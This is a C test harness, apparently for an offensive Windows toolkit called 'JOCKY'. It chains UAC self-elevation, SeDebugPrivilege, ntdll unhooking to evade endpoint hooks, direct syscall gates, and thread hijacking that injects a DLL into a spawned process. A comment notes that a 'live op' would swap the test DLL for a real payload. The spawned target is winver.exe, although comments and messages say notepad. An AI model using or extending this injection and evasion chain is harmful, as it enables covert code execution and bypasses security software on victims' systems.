/*
 * test_phase12.c — JOCKY Phase 12: All-5-Enhancement Integration Test
 * execution_engine/test_phase12.c
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * Execution order:
 *   E4  unhook_ntdll()          — restore clean .text in loaded ntdll
 *   E3  sgx_init()              — extract SSNs from now-clean stubs
 *   E1  (stub is 80 bytes)      — baked into hijack.c
 *   E2  (thread scoring)        — baked into find_best_thread() in hijack.c
 *   E5  rdll_stage + build      — prepare LoadLibraryA PIC payload
 *       JOCKY_hijack_thread(pid, payload, size)   <-- scored selection
 *
 * DLL injected: winmm.dll (Windows multimedia — present on every Windows
 * install, safe to double-load since LoadLibraryA is ref-counted).
 * After injection, verify winmm is in notepad's module list via
 * CreateToolhelp32Snapshot(TH32CS_SNAPMODULE).
 *
 * Build:
 *   clang execution_engine/thread_hijacker/hijack.c        \
 *         execution_engine/syscall_gate/syscall_gate.c     \
 *         execution_engine/ntdll_unhook/ntdll_unhook.c     \
 *         execution_engine/rdll_loader/rdll_loader.c       \
 *         execution_engine/test_phase12.c                  \
 *         -o test_phase12.exe -lkernel32 -lshell32
 *
 * Run: .\test_phase12.exe  (UAC auto-elevates via self_elevate())
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>

#include "thread_hijacker/hijack.h"
#include "syscall_gate/syscall_gate.h"
#include "ntdll_unhook/ntdll_unhook.h"
#include "rdll_loader/rdll_loader.h"

/* ── elevation helpers (identical to Phase 11) ───────────────── */

static BOOL is_elevated(void)
{
    BOOL   e  = FALSE;
    HANDLE ht = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &ht)) return FALSE;
    TOKEN_ELEVATION te; DWORD sz = sizeof(te);
    if (GetTokenInformation(ht, TokenElevation, &te, sizeof(te), &sz))
        e = (te.TokenIsElevated != 0);
    CloseHandle(ht);
    return e;
}

static void self_elevate(void)
{
    WCHAR path[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, path, MAX_PATH);
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas"; sei.lpFile = path;
    sei.lpParameters = L"/elevated";
    sei.nShow = SW_NORMAL; sei.fMask = SEE_MASK_NOASYNC;
    if (!ShellExecuteExW(&sei)) { printf("[!] UAC failed\n"); exit(1); }
    exit(0);
}

static void attach_console(void)
{
    AllocConsole();
    FILE *fp = NULL;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
    SetConsoleTitleW(L"JOCKY Phase 12");
}

static BOOL enable_debug_privilege(void)
{
    HANDLE ht = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &ht))
        return FALSE;
    LUID luid;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
    AdjustTokenPrivileges(ht, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError(); CloseHandle(ht);
    return err != ERROR_NOT_ALL_ASSIGNED;
}

/* ── module presence check ───────────────────────────────────── */

/*
 * has_module — TRUE if dll_name appears in target_pid's module list.
 * Uses TH32CS_SNAPMODULE (requires SeDebugPrivilege).
 */
static BOOL has_module(DWORD pid, const char *dll_name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;
    MODULEENTRY32 me = { .dwSize = sizeof(me) };
    BOOL found = FALSE;
    if (Module32First(snap, &me)) {
        do {
            if (_stricmp(me.szModule, dll_name) == 0) { found = TRUE; break; }
        } while (Module32Next(snap, &me));
    }
    CloseHandle(snap);
    return found;
}

/* ── main ────────────────────────────────────────────────────── */

int main(int argc, char **argv)
{
    BOOL elevated_child = FALSE;
    for (int i = 1; i < argc; i++)
        if (strcmp(argv[i], "/elevated") == 0) { elevated_child = TRUE; break; }
    if (elevated_child) attach_console();
    if (!is_elevated()) { printf("[*] requesting UAC elevation\n"); self_elevate(); }

    printf("JOCKY Phase 12 -- All-5-Enhancement Integration\n");
    printf("================================================\n\n");

    /* ── E4: unhook ntdll ── */
    printf("[E4] Restoring ntdll .text...\n");
    fflush(stdout);
    if (!unhook_ntdll()) {
        printf("[E4] FAILED\n");
        goto bail;
    }
    printf("[E4] ok\n\n");

    /* ── E3: init syscall gates ── */
    printf("[E3] Initialising syscall gates...\n");
    fflush(stdout);
    if (!sgx_init()) {
        printf("[E3] FAILED\n");
        goto bail;
    }
    printf("[E3] ok\n\n");

    /* ── Elevation prerequisite ── */
    printf("[priv] Enabling SeDebugPrivilege...  ");
    if (!enable_debug_privilege()) { printf("FAILED\n"); goto bail; }
    printf("ok\n\n");

    /* ── Spawn winver ── */
    printf("[target] Spawning winver.exe...     ");
    fflush(stdout);
    STARTUPINFOW        si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(L"C:\\Windows\\System32\\winver.exe",
                    NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("FAILED error=%lu\n", GetLastError()); goto bail;
    }
    printf("ok (pid=%lu tid=%lu)\n", pi.dwProcessId, pi.dwThreadId);

    /*
     * Win11 new Notepad (WinApp SDK): pi.dwThreadId is the bootstrap thread —
     * it initialises the WinUI3 runtime then exits.  Sleep(1000) isn't enough;
     * the UI thread pool isn't stable until ~1.5–2s after spawn.
     * Sleep(2500) gives the message loop thread time to enter WrUserRequest.
     */
    Sleep(2500);

    /* ── guard: verify the process itself is still alive ──
     *
     * If Win11 notepad is already running, CreateProcessW may spawn an
     * activation-redirect stub that hands off to the existing instance and
     * exits the whole process.  Catch that before trying to inject.
     */
    {
        DWORD ec = 0;
        GetExitCodeProcess(pi.hProcess, &ec);
        if (ec != STILL_ACTIVE) {
            printf("[!] notepad process exited (ec=%lu) — Win11 activation redirect.\n"
                   "[!] Close all running notepad windows and retry, or switch\n"
                   "[!] target to mspaint.exe (see comment in source).\n", ec);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            goto bail;
        }
        printf("[target] process alive after 2.5s settle ✓\n");
    }

    /* ── E5: build rdll payload targeting winmm.dll ── */
    printf("\n[E5] Staging + building rdll payload for winmm.dll\n");
    fflush(stdout);

    /*
     * We use a pre-existing system DLL as the injection target so the
     * test requires no compiled payload DLL.  winmm.dll is mapped into
     * almost nothing by default so its presence in notepad confirms
     * that our LoadLibraryA stub executed.
     *
     * On a live op you'd replace this path with your own payload DLL
     * that was staged via rdll_stage_to_temp().
     */
    const char *target_dll = "C:\\Windows\\System32\\winmm.dll";

    LPBYTE payload  = NULL;
    DWORD  pay_size = 0;
    if (!rdll_build_payload(target_dll, &payload, &pay_size)) {
        printf("[E5] build_payload FAILED\n");
        TerminateProcess(pi.hProcess, 1);
        goto bail;
    }
    printf("[E5] payload ready (%lu bytes)\n\n", pay_size);

    /* ── E1+E2: hijack — scored thread selection, NOT pi.dwThreadId ──
     *
     * JOCKY_hijack_thread() calls find_best_thread() which queries
     * NtQuerySystemInformation and scores every thread by ThreadState +
     * WaitReason.  Terminating/non-Waiting threads score ≤ -200 and are
     * skipped.  The WinUI3 message loop thread will be in WrUserRequest
     * (score=100) — exactly what we want.
     *
     * We deliberately do NOT pass pi.dwThreadId here — that's the dead
     * bootstrap thread on Win11 Notepad.
     */
    printf("[hijack] Scoring and selecting best thread in pid=%lu...\n",
           pi.dwProcessId);
    fflush(stdout);

    BOOL ok = JOCKY_hijack_thread(
        pi.dwProcessId,
        payload,
        pay_size
    );

    HeapFree(GetProcessHeap(), 0, payload);   /* done with the blob */

    if (!ok) {
        printf("[hijack] FAILED error=%lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        goto bail;
    }
    printf("[hijack] ok\n\n");

    /* ── Verify: dump full module list, then check for winmm ── */
    Sleep(300);   /* give loader a moment to finalise */

    printf("[verify] module list for pid=%lu:\n", pi.dwProcessId);
    fflush(stdout);
    {
        HANDLE sn = CreateToolhelp32Snapshot(
            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pi.dwProcessId);
        if (sn == INVALID_HANDLE_VALUE) {
            printf("  snapshot FAILED error=%lu\n", GetLastError());
        } else {
            MODULEENTRY32 m = { .dwSize = sizeof(m) };
            int count = 0;
            if (Module32First(sn, &m)) {
                do {
                    printf("  [%3d] %s\n", count, m.szModule);
                    count++;
                } while (Module32Next(sn, &m));
            }
            printf("  total: %d modules\n", count);
            CloseHandle(sn);
        }
    }

    printf("[verify] Checking for winmm.dll...  ");
    fflush(stdout);
    if (has_module(pi.dwProcessId, "winmm.dll")) {
        printf("FOUND  ← LoadLibraryA stub executed cleanly\n");
    } else {
        printf("NOT FOUND (stub may have been too early; check with Process Explorer)\n");
    }

    /* ── Verify: notepad still alive ── */
    printf("[verify] notepad still alive...            ");
    DWORD exit_code = 0;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    printf(exit_code == STILL_ACTIVE ? "ok\n" : "CRASHED (code=%lu)\n", exit_code);

    /* ── Cleanup ── */
    printf("\n[cleanup] Terminating notepad...\n");
    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 2000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    sgx_cleanup();

    printf("\nPhase 12 complete — all 5 enhancements exercised.\n");

    if (elevated_child) { printf("\nPress Enter to close...\n"); getchar(); }
    return 0;

bail:
    sgx_cleanup();
    if (elevated_child) { printf("\nPress Enter to close...\n"); getchar(); }
    return 1;
}